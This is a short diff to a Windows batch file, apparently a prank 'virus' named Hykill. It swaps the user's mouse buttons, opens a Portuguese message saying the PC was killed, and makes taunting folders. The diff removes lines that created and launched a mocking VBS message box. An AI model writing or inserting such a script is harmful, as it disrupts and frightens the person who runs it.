@@ -6,9 +6,6 @@ pause
 Rundll32 user32 , SwapMouseButton
 echo "Seu PC foi morto pelo virus hykill." > HYKILL.txt
 Start HYKILL.txt
-echo "MsgBox Hykill matou seu pc",16,"ahahahhahahahhahahahah" > hahahahahahahhahah.vbs 
-echo "MsgBox Hykill matou seu pc",16,"ahahahhahahahhahahahah" > hahahahahahahhahah.vbs 
-start hahahahahahahhahah.vbs
 Md AHAHAHAHAHHAHAHAH
 Md trojan Hykill
 md hahahaha
